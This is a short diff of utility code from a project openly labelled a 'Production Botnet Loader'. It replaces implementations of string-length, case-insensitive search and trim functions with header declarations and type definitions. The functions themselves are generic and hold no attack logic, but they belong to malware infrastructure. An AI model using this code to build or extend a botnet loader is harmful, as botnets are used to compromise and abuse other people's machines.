@@ -1,51 +1,21 @@
 /*
- * Production Botnet Loader - Utility Functions
+ * Production Botnet Loader - Utility Functions Header
  */
 
-#include "includes.h"
-#include "util.h"
+#ifndef _LOADER_UTIL_H
+#define _LOADER_UTIL_H
 
-int util_strlen(char *str) {
-    int c = 0;
-    while (*str++ != 0) c++;
-    return c;
-}
+#include <ctype.h>
+#include <stdbool.h>
 
-char *util_stristr(char *haystack, int haystack_len, char *needle) {
-    int needle_len = util_strlen(needle);
-    if (needle_len > haystack_len) return NULL;
-    
-    for (int i = 0; i <= haystack_len - needle_len; i++) {
-        char *pos = haystack + i;
-        BOOL match = TRUE;
-        
-        for (int j = 0; j < needle_len; j++) {
-            char h = tolower(pos[j]);
-            char n = tolower(needle[j]);
-            if (h != n) {
-                match = FALSE;
-                break;
-            }
-        }
-        
-        if (match) return pos;
-    }
-    return NULL;
-}
+/* Type definitions */
+typedef bool BOOL;
+#define TRUE true
+#define FALSE false
 
-char *util_trim(char *str) {
-    char *end;
-    
-    /* Trim leading space */
-    while (isspace(*str)) str++;
-    
-    if (*str == 0) return str;
-    
-    /* Trim trailing space */
-    end = str + util_strlen(str) - 1;
-    while (end > str && isspace(*end)) end--;
-    
-    *(end + 1) = 0;
-    
-    return str;
-}
+/* Function declarations */
+int util_strlen(char *str);
+char *util_stristr(char *haystack, int haystack_len, char *needle);
+char *util_trim(char *str);
+
+#endif
